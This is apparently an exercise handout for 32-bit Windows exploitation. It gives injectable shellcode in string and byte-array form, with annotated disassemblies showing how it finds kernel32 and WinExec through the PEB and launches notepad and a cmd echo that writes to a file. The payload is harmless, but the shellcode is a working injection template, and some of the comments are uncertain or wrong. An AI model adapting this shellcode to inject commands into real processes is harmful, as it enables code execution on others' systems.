Shellcode as a string:
"\x31\xC0\x64\x8B\x60\x08\x8D\x2C\x24\x31\xC0\x64\x8B\x58\x30\x8B\x5B\x0C\x8B\x5B\x14\x8B\x1B\x8B\x1B\x8B\x43\x10\x8B\x50\x3C\x01\xC2\x31\xDB\xB3\x78\x01\xD3\x8B\x1B\x01\xC3\x8B\x53\x24\x01\xC2\x53\x8B\x5B\x20\x01\xC3\x8B\x0B\x8D\x09\x01\xC1\x8B\x09\x81\xF9\x57\x69\x6E\x45\x8D\x5B\x04\x8D\x52\x02\x75\xEA\x4A\x4A\x8B\x12\xC1\xE2\x10\xC1\xEA\x10\x5B\x8B\x5B\x1C\x01\xC3\x01\xD3\x01\xD3\x01\xD3\x01\xD3\x8B\x13\x01\xC2\xEB\x22\x5B\x89\xD8\x04\x09\x31\xC9\x88\x08\x8D\x40\x2C\x88\x08\x8D\x40\xD5\x52\x6A\x05\x50\xFF\xD2\x5A\x6A\x05\x53\xFF\xD2\xE9\xFB\xFF\xFF\xFF\xE8\xD9\xFF\xFF\xFF\x6E\x6F\x74\x65\x70\x61\x64\x20\x66\x90\x63\x6D\x64\x20\x2F\x43\x20\x22\x65\x63\x68\x6F\x20\x48\x65\x6C\x6C\x6F\x2C\x20\x79\x6F\x75\x20\x68\x61\x76\x65\x20\x61\x20\x70\x72\x6F\x62\x6C\x65\x6D\x21\x20\x3E\x66\x22"

Shellcode as a byte array:
{ 0x31, 0xC0, 0x64, 0x8B, 0x60, 0x08, 0x8D, 0x2C, 0x24, 0x31, 0xC0, 0x64, 0x8B, 0x58, 0x30, 0x8B, 0x5B, 0x0C, 0x8B, 0x5B, 0x14, 0x8B, 0x1B, 0x8B, 0x1B, 0x8B, 0x43, 0x10, 0x8B, 0x50, 0x3C, 0x01, 0xC2, 0x31, 0xDB, 0xB3, 0x78, 0x01, 0xD3, 0x8B, 0x1B, 0x01, 0xC3, 0x8B, 0x53, 0x24, 0x01, 0xC2, 0x53, 0x8B, 0x5B, 0x20, 0x01, 0xC3, 0x8B, 0x0B, 0x8D, 0x09, 0x01, 0xC1, 0x8B, 0x09, 0x81, 0xF9, 0x57, 0x69, 0x6E, 0x45, 0x8D, 0x5B, 0x04, 0x8D, 0x52, 0x02, 0x75, 0xEA, 0x4A, 0x4A, 0x8B, 0x12, 0xC1, 0xE2, 0x10, 0xC1, 0xEA, 0x10, 0x5B, 0x8B, 0x5B, 0x1C, 0x01, 0xC3, 0x01, 0xD3, 0x01, 0xD3, 0x01, 0xD3, 0x01, 0xD3, 0x8B, 0x13, 0x01, 0xC2, 0xEB, 0x22, 0x5B, 0x89, 0xD8, 0x04, 0x09, 0x31, 0xC9, 0x88, 0x08, 0x8D, 0x40, 0x2C, 0x88, 0x08, 0x8D, 0x40, 0xD5, 0x52, 0x6A, 0x05, 0x50, 0xFF, 0xD2, 0x5A, 0x6A, 0x05, 0x53, 0xFF, 0xD2, 0xE9, 0xFB, 0xFF, 0xFF, 0xFF, 0xE8, 0xD9, 0xFF, 0xFF, 0xFF, 0x6E, 0x6F, 0x74, 0x65, 0x70, 0x61, 0x64, 0x20, 0x66, 0x90, 0x63, 0x6D, 0x64, 0x20, 0x2F, 0x43, 0x20, 0x22, 0x65, 0x63, 0x68, 0x6F, 0x20, 0x48, 0x65, 0x6C, 0x6C, 0x6F, 0x2C, 0x20, 0x79, 0x6F, 0x75, 0x20, 0x68, 0x61, 0x76, 0x65, 0x20, 0x61, 0x20, 0x70, 0x72, 0x6F, 0x62, 0x6C, 0x65, 0x6D, 0x21, 0x20, 0x3E, 0x66, 0x22 }


Dissasembly in AT&T syntax, showing typical memory addresses when injected into Exercise2 executable but 
these may be slightly difference from the addresses you see.

Section 1: Establish a new stack frame

0x0061fc46:	31 c0                  		xor    %eax,%eax		; Set eax to zero
0x0061fc48:	64 8b 60 08            		mov    %fs:0x8(%eax),%esp	; Move Segment:Offset(base) to esp 
0x0061fc4c:	8d 2c 24               		lea    (%esp),%ebp		; Load effective address specified by esp to ebp (Creates virtual stack)

Section 2: Find the kernel.dll base address

0x0061fc4f:	31 c0                  		xor    %eax,%eax		; EAX = 0
0x0061fc51:	64 8b 58 30            		mov    %fs:0x30(%eax),%ebx	; EBX = PEB(Process Environment Block) // using offset fs:0x30 (Segment:offset)
0x0061fc55:	8b 5b 0c               		mov    0xc(%ebx),%ebx		; EBX = PEB_LDR_DATA // using offset 0xc 
0x0061fc58:	8b 5b 14               		mov    0x14(%ebx),%ebx		; EBX = LDR->InMemoryOrderModuleList // using offset 0x14 (First list entry)
0x0061fc5b:	8b 1b                  		mov    (%ebx),%ebx		; EBX = second list entry (ntdll.dll) // in InMemoryOrderModuleList (offset 0x00)
0x0061fc5d:	8b 1b                  		mov    (%ebx),%ebx		; EBX = third list entry (kernel32.dll) // in InMemoryOrderModuleList (offset 0x00)
0x0061fc5f:	8b 43 10               		mov    0x10(%ebx),%eax		; EAX = base address of kernel32.dll // using offset 0x10 from EBX

Section 3: Find the function address of WinExec

0x0061fc62:	8b 50 3c               		mov    0x3c(%eax),%edx		; EDX = Relative Virtual Memory (RVA) of the PE signature (base address + 0x3c)
0x0061fc65:	01 c2                  		add    %eax,%edx		; EDX = Address of PE signature = base address + RVA of PE signature

0x0061fc67:	31 db                  		xor    %ebx,%ebx		; EBX = 0
0x0061fc69:	b3 78                  		mov    $0x78,%bl		; EBX = 0x78
0x0061fc6b:	01 d3                  		add    %edx,%ebx		; EBX = RVA of Export Table = Address of PE + offset 0x78
0x0061fc6d:	8b 1b                  		mov    (%ebx),%ebx		; EBX is a pointer to a number // Move the value pointed to by EBX to EBX
0x0061fc6f:	01 c3                  		add    %eax,%ebx		; EBX = Address of Export Table = base address + RVA of export table

0x0061fc71:	8b 53 24               		mov    0x24(%ebx),%edx		; EDX = RVA of Ordinal Table = Address of Export Table + offset 0x24
0x0061fc74:	01 c2                  		add    %eax,%edx		; EDX = Address of Ordinal Table = base address + RVA of Ordinal Table

0x0061fc76:	53                     		push   %ebx			; Save current value of ebx in stack
0x0061fc77:	8b 5b 20               		mov    0x20(%ebx),%ebx		; EBX = RVA of Name Pointer Table = Address of Export Table + 0x20
0x0061fc7a:	01 c3                  		add    %eax,%ebx		; EBX = Address of Name Pointer Table = base address + RVA of Name Pointer Table

0x0061fc7c:	8b 0b                  		mov    (%ebx),%ecx		; ECX = Next list entry of Name Pointer Table ???????
0x0061fc7e:	8d 09                  		lea    (%ecx),%ecx		; Load effective address pointed to by ecx into ecx ??????
0x0061fc80:	01 c1                  		add    %eax,%ecx		; ECX = base address + address of next list entry
0x0061fc82:	8b 09                  		mov    (%ecx),%ecx		; Move the value pointed by ecx to ecx ???????
0x0061fc84:	81 f9 57 69 6e 45      		cmp    $0x456e6957,%ecx		; Compare the current value to Winexec
0x0061fc8a:	8d 5b 04               		lea    0x4(%ebx),%ebx		; EBX = Step ebx 4 steps up
0x0061fc8d:	8d 52 02               		lea    0x2(%edx),%edx		; EDX = Step edx 2 steps up
0x0061fc90:	75 ea                  		jne    0x61fc7c			; Jump to beginning of this block if comparison not equal
0x0061fc92:	4a                     		dec    %edx			; Decrement edx
0x0061fc93:	4a                     		dec    %edx			; Decrement edx
0x0061fc94:	8b 12                  		mov    (%edx),%edx		; Load contents at edx's new address
0x0061fc96:	c1 e2 10               		shl    $0x10,%edx		; Shift 1 bit to the left (multipy by 2)
0x0061fc99:	c1 ea 10               		shr    $0x10,%edx		; Shift 1 bit to the right (divide by 2)
0x0061fc9c:	5b                     		pop    %ebx			; Retain saved EBX value

0x0061fc9d:	8b 5b 1c               		mov    0x1c(%ebx),%ebx		; EBX = RVA of Adress Table = Address of Export Table
0x0061fca0:	01 c3                  		add    %eax,%ebx		; EBX = Address of Address Table = base address + RAV of Address Table
0x0061fca2:	01 d3                  		add    %edx,%ebx		; ..
0x0061fca4:	01 d3                  		add    %edx,%ebx		; ..
0x0061fca6:	01 d3                  		add    %edx,%ebx		; ..
0x0061fca8:	01 d3                  		add    %edx,%ebx		; Add edx to ebx 4 times ???????
0x0061fcaa:	8b 13                  		mov    (%ebx),%edx		; EDX = Content pointed to by ebx
0x0061fcac:	01 c2                  		add    %eax,%edx		; 
0x0061fcae:	eb 22                  		jmp    0x61fcd2			; Jump to function call

Section 4: Start of Function

0x0061fcb0:	5b                     		pop    %ebx			; Retain saved EBX value -- What value ?????
0x0061fcb1:	89 d8                  		mov    %ebx,%eax		; Move it to EAX
0x0061fcb3:	04 09                  		add    $0x9,%al			; Add offset 0x9 to last 8 bits of EAX
0x0061fcb5:	31 c9                  		xor    %ecx,%ecx		; ECX = 0
0x0061fcb7:	88 08                  		mov    %cl,(%eax)		; Move last 8 bits of ECX to EAX (EAX = 0 ????? )
0x0061fcb9:	8d 40 2c               		lea    0x2c(%eax),%eax		; EAX = Effective address at eax + offset 0x2c 
0x0061fcbc:	88 08                  		mov    %cl,(%eax)		; Move last 8 bits of ECX to EAX (EAX = 0 ????? )
0x0061fcbe:	8d 40 d5               		lea    -0x2b(%eax),%eax		; EAX = Effective address at EAX - offset 0x2b
0x0061fcc1:	52                     		push   %edx			; Save current EDX value onto stack
0x0061fcc2:	6a 05                  		push   $0x5			; Push 0x5
0x0061fcc4:	50                     		push   %eax			; Save current EAX value onto stack 
0x0061fcc5:	ff d2                  		call   *%edx			; Call function pointed to by EDX
0x0061fcc7:	5a                     		pop    %edx			; Pop EDX from stack
0x0061fcc8:	6a 05                  		push   $0x5			; Push 0x5
0x0061fcca:	53                     		push   %ebx			; Save current EBX value onto stack
0x0061fccb:	ff d2                  		call   *%edx			; Call function pointed to by EDX

0x0061fccd:	e9 fb ff ff ff         		jmp    0x61fccd			; Jump here ?????????

0x0061fcd2:	e8 d9 ff ff ff         		call   0x61fcb0			; 

Section: Passed Parameters

0x0061fcda:  6e 6f 74 65 70 61 64 20						; Pass as a command, Open/Create notepad file called f and write "Hello, You have a problem!"
0x0061fce2:  66 90 63 6d 64 20 2f 43						
0x0061fcea:  20 22 65 63 68 6f 20 48						
0x0061fcf2:  65 6c 6c 6f 2c 20 79 6f						
0x0061fcfa:  75 20 68 61 76 65 20 61						
0x0061fd02:  20 70 72 6f 62 6c 65 6d						
0x0061fd0a:  21 20 3e 66 22         						



Dissasembly in Intel syntax, showing typical memory addresses when injected into Exercise2 executable but 
these may be slightly difference from the addresses you see.

0x0061fc46:	31 c0             	    xor    eax,eax	                      
0x0061fc48:	64 8b 60 08                 mov    esp,DWORD PTR fs:[eax+0x8]
0x0061fc4c:	8d 2c 24                    lea    ebp,[esp]

0x0061fc4f:	31 c0                       xor    eax,eax
0x0061fc51:	64 8b 58 30                 mov    ebx,DWORD PTR fs:[eax+0x30]
0x0061fc55:	8b 5b 0c                    mov    ebx,DWORD PTR [ebx+0xc]
0x0061fc58:	8b 5b 14                    mov    ebx,DWORD PTR [ebx+0x14]
0x0061fc5b:	8b 1b                       mov    ebx,DWORD PTR [ebx]
0x0061fc5d:	8b 1b                       mov    ebx,DWORD PTR [ebx]
0x0061fc5f:	8b 43 10                    mov    eax,DWORD PTR [ebx+0x10]
0x0061fc62:	8b 50 3c                    mov    edx,DWORD PTR [eax+0x3c]
0x0061fc65:	01 c2                       add    edx,eax
0x0061fc67:	31 db                       xor    ebx,ebx
0x0061fc69:	b3 78                       mov    bl,0x78
0x0061fc6b:	01 d3                       add    ebx,edx
0x0061fc6d:	8b 1b                       mov    ebx,DWORD PTR [ebx]
0x0061fc6f:	01 c3                       add    ebx,eax
0x0061fc71:	8b 53 24                    mov    edx,DWORD PTR [ebx+0x24]
0x0061fc74:	01 c2                       add    edx,eax
0x0061fc76:	53                          push   ebx
0x0061fc77:	8b 5b 20                    mov    ebx,DWORD PTR [ebx+0x20]
0x0061fc7a:	01 c3                       add    ebx,eax
0x0061fc7c:	8b 0b                       mov    ecx,DWORD PTR [ebx]
0x0061fc7e:	8d 09                       lea    ecx,[ecx]
0x0061fc80:	01 c1                       add    ecx,eax
0x0061fc82:	8b 09                       mov    ecx,DWORD PTR [ecx]
0x0061fc84:	81 f9 57 69 6e 45           cmp    ecx,0x456e6957
0x0061fc8a:	8d 5b 04                    lea    ebx,[ebx+0x4]
0x0061fc8d:	8d 52 02                    lea    edx,[edx+0x2]
0x0061fc90:	75 ea                       jne    0x36
0x0061fc92:	4a                          dec    edx
0x0061fc93:	4a                          dec    edx
0x0061fc94:	8b 12                       mov    edx,DWORD PTR [edx]
0x0061fc96:	c1 e2 10                    shl    edx,0x10
0x0061fc99:	c1 ea 10                    shr    edx,0x10
0x0061fc9c:	5b                          pop    ebx
0x0061fc9d:	8b 5b 1c                    mov    ebx,DWORD PTR [ebx+0x1c]
0x0061fca0:	01 c3                       add    ebx,eax
0x0061fca2:	01 d3                       add    ebx,edx
0x0061fca4:	01 d3                       add    ebx,edx
0x0061fca6:	01 d3                       add    ebx,edx
0x0061fca8:	01 d3                       add    ebx,edx
0x0061fcaa:	8b 13                       mov    edx,DWORD PTR [ebx]
0x0061fcac:	01 c2                       add    edx,eax

0x0061fcae:	eb 22                       jmp    0x61fcd2
0x0061fcb0:	5b                          pop    ebx
0x0061fcb1:	89 d8                       mov    eax,ebx
0x0061fcb3:	04 09                       add    al,0x9
0x0061fcb5:	31 c9                       xor    ecx,ecx
0x0061fcb7:	88 08                       mov    BYTE PTR [eax],cl
0x0061fcb9:	8d 40 2c                    lea    eax,[eax+0x2c]
0x0061fcbc:	88 08                       mov    BYTE PTR [eax],cl
0x0061fcbe:	8d 40 d5                    lea    eax,[eax-0x2b]

0x0061fcc1:	52                          push   edx
0x0061fcc2:	6a 05                       push   0x5
0x0061fcc4:	50                          push   eax
0x0061fcc5:	ff d2                       call   edx
0x0061fcc7:	5a                          pop    edx
0x0061fcc8:	6a 05                       push   0x5
0x0061fcca:	53                          push   ebx
0x0061fccb:	ff d2                       call   edx

0x0061fccd:	e9 fb ff ff ff              jmp    0x61fccd

0x0061fcd2:	e8 d9 ff ff ff              call   0x61fcb0

0x0061fcda:  6e 6f 74 65 70 61 64 20
0x0061fce2:  66 90 63 6d 64 20 2f 43
0x0061fcea:  20 22 65 63 68 6f 20 48
0x0061fcf2:  65 6c 6c 6f 2c 20 79 6f
0x0061fcfa:  75 20 68 61 76 65 20 61
0x0061fd02:  20 70 72 6f 62 6c 65 6d
0x0061fd0a:  21 20 3e 66 22         